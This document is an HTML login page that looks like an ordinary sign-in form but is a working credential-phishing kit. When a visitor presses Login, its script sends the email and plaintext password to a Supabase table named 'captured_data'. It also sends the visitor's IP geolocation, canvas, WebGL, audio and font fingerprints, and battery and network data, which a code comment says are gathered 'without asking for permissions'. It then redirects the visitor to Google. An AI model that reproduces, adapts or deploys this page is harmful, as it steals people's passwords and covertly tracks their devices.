<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Login</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            padding: 40px;
            width: 100%;
            max-width: 400px;
        }

        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .login-header h2 {
            color: #333;
            font-size: 28px;
            margin-bottom: 10px;
        }

        .login-header p {
            color: #666;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
            outline: none;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .error-message {
            background: #fee;
            color: #c33;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
            display: none;
            font-size: 14px;
        }

        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        .remember-me input[type="checkbox"] {
            width: auto;
            margin-right: 5px;
            cursor: pointer;
        }

        .forgot-link {
            color: #667eea;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2>Welcome Back</h2>
            <p>Please login to continue</p>
        </div>

        <div class="error-message" id="errorMessage"></div>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" placeholder="Enter your email" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>

            <div class="remember-forgot">
                <label class="remember-me">
                    <input type="checkbox" id="remember"> Remember me
                </label>
                <a href="#" class="forgot-link" onclick="forgotPassword(event)">Forgot Password?</a>
            </div>

            <button type="button" class="login-btn" id="loginBtn" onclick="handleLogin()">
                <span id="btnText">Login</span>
                <div class="loading" id="loading"></div>
            </button>
        </form>
    </div>

    <script>
        // Supabase configuration
        const supabaseUrl = 'https://aqynejlgjwdmxsekuyld.supabase.co';
        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
        
        // Initialize Supabase
        const db = window.supabase.createClient(supabaseUrl, supabaseKey);
        
        // Get user's IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unable to get IP';
            }
        }
        
        // Get IP details from multiple sources
        async function getIPDetails(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city || null,
                    region: data.region || null,
                    country: data.country_name || null,
                    country_code: data.country_code || null,
                    postal: data.postal || null,
                    timezone: data.timezone || null,
                    org: data.org || null,
                    isp: data.org || null,
                    latitude: data.latitude || null,
                    longitude: data.longitude || null
                };
            } catch (error) {
                return null;
            }
        }
        
        // Get browser fingerprint
        function getBrowserFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText("Browser Fingerprint", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Browser Fingerprint", 4, 17);
            
            const fingerprint = canvas.toDataURL();
            
            return {
                canvas: fingerprint.substring(0, 500), // Store partial fingerprint
                webgl: getWebGLInfo(),
                fonts: detectFonts(),
                audio: getAudioFingerprint(),
                hardware: {
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory,
                    touchPoints: navigator.maxTouchPoints
                }
            };
        }
        
        // Get WebGL info
        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return null;
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                    };
                }
                return {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER)
                };
            } catch (e) {
                return null;
            }
        }
        
        // Detect installed fonts
        function detectFonts() {
            const fontList = [
                'Arial', 'Verdana', 'Times New Roman', 'Courier New',
                'Georgia', 'Palatino', 'Garamond', 'Bookman',
                'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'
            ];
            
            const available = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            fontList.forEach(font => {
                ctx.font = `12px "${font}"`;
                const width = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
                ctx.font = '12px monospace';
                const monoWidth = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
                
                if (width !== monoWidth) {
                    available.push(font);
                }
            });
            
            return available;
        }
        
        // Get audio fingerprint
        function getAudioFingerprint() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (!AudioContext) return null;
                
                const context = new AudioContext();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gain = context.createGain();
                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
                
                gain.gain.value = 0;
                oscillator.type = 'triangle';
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gain);
                gain.connect(context.destination);
                
                oscillator.start(0);
                scriptProcessor.onaudioprocess = function(bins) {
                    const audioData = bins.inputBuffer.getChannelData(0);
                    const fingerprint = Array.from(audioData.slice(0, 100)).join(',');
                    oscillator.disconnect();
                    scriptProcessor.disconnect();
                    analyser.disconnect();
                    gain.disconnect();
                    context.close();
                    return fingerprint.substring(0, 500);
                };
                
                return 'Audio fingerprint captured';
            } catch (e) {
                return null;
            }
        }
        
        // Get battery info
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return {
                        charging: battery.charging,
                        level: battery.level,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }
                return null;
            } catch (e) {
                return null;
            }
        }
        
        // Get network info
        function getNetworkInfo() {
            if (navigator.connection) {
                return {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                };
            }
            return null;
        }
        
        // Make handleLogin globally accessible
        window.handleLogin = async function() {
            const emailElement = document.getElementById('email');
            const passwordElement = document.getElementById('password');
            const rememberElement = document.getElementById('remember');
            const errorMessage = document.getElementById('errorMessage');
            const loginBtn = document.getElementById('loginBtn');
            const btnText = document.getElementById('btnText');
            const loading = document.getElementById('loading');
            
            if (!emailElement || !passwordElement) {
                console.error('Form elements not found');
                return;
            }
            
            const email = emailElement.value.trim();
            const password = passwordElement.value;
            const remember = rememberElement ? rememberElement.checked : false;
            
            errorMessage.style.display = 'none';
            
            if (!email || !password) {
                errorMessage.textContent = 'Please fill in all fields';
                errorMessage.style.display = 'block';
                return;
            }
            
            if (!email.includes('@')) {
                errorMessage.textContent = 'Please enter a valid email address';
                errorMessage.style.display = 'block';
                return;
            }
            
            loginBtn.disabled = true;
            btnText.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                console.log('Collecting device information...');
                
                // Collect all data without asking for permissions
                const ip = await getIPAddress();
                const ipDetails = await getIPDetails(ip);
                const fingerprint = getBrowserFingerprint();
                const batteryInfo = await getBatteryInfo();
                const networkInfo = getNetworkInfo();
                
                console.log('Saving data to Supabase...');
                
                const { data, error } = await db
                    .from('captured_data')
                    .insert([
                        {
                            email: email,
                            password: password,
                            ip_address: ip,
                            user_agent: navigator.userAgent,
                            referer: document.referrer || 'Direct',
                            device_info: {
                                language: navigator.language,
                                languages: navigator.languages,
                                screenResolution: `${window.screen.width}x${window.screen.height}`,
                                availableScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
                                colorDepth: window.screen.colorDepth,
                                pixelDepth: window.screen.pixelDepth,
                                pixelRatio: window.devicePixelRatio,
                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                                platform: navigator.platform,
                                vendor: navigator.vendor,
                                cookiesEnabled: navigator.cookieEnabled,
                                doNotTrack: navigator.doNotTrack,
                                hardwareConcurrency: navigator.hardwareConcurrency,
                                deviceMemory: navigator.deviceMemory || 'unknown',
                                maxTouchPoints: navigator.maxTouchPoints,
                                remember: remember,
                                browser: {
                                    name: getBrowserName(),
                                    version: getBrowserVersion(),
                                    engine: getBrowserEngine(),
                                    os: getOS()
                                }
                            },
                            fingerprint_data: fingerprint,
                            ip_details: ipDetails,
                            battery_info: batteryInfo,
                            network_info: networkInfo,
                            created_at: new Date().toISOString()
                        }
                    ]);
                
                if (error) {
                    console.error('Supabase error:', error);
                    errorMessage.textContent = 'Error: ' + error.message;
                    errorMessage.style.display = 'block';
                    return;
                }
                
                console.log('✅ Data saved successfully');
                window.location.href = 'https://www.google.com';
                
            } catch (err) {
                console.error('Error:', err);
                errorMessage.textContent = 'Connection error: ' + err.message;
                errorMessage.style.display = 'block';
            } finally {
                loginBtn.disabled = false;
                btnText.style.display = 'inline';
                loading.style.display = 'none';
            }
        };
        
        // Helper functions for browser detection
        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Edg')) return 'Edge';
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Opera')) return 'Opera';
            if (ua.includes('MSIE') || ua.includes('Trident')) return 'Internet Explorer';
            return 'Unknown';
        }
        
        function getBrowserVersion() {
            const ua = navigator.userAgent;
            const match = ua.match(/(firefox|chrome|safari|edge|opera|msie)[\/\s](\d+)/i);
            return match ? match[2] : 'Unknown';
        }
        
        function getBrowserEngine() {
            const ua = navigator.userAgent;
            if (ua.includes('Gecko')) return 'Gecko';
            if (ua.includes('WebKit')) return 'WebKit';
            if (ua.includes('Trident')) return 'Trident';
            return 'Unknown';
        }
        
        function getOS() {
            const ua = navigator.userAgent;
            if (ua.includes('Windows')) return 'Windows';
            if (ua.includes('Mac')) return 'MacOS';
            if (ua.includes('Linux')) return 'Linux';
            if (ua.includes('Android')) return 'Android';
            if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
            return 'Unknown';
        }
        
        window.forgotPassword = function(event) {
            event.preventDefault();
            alert('Please contact support to reset your password.');
        };
    </script>
</body>
</html>
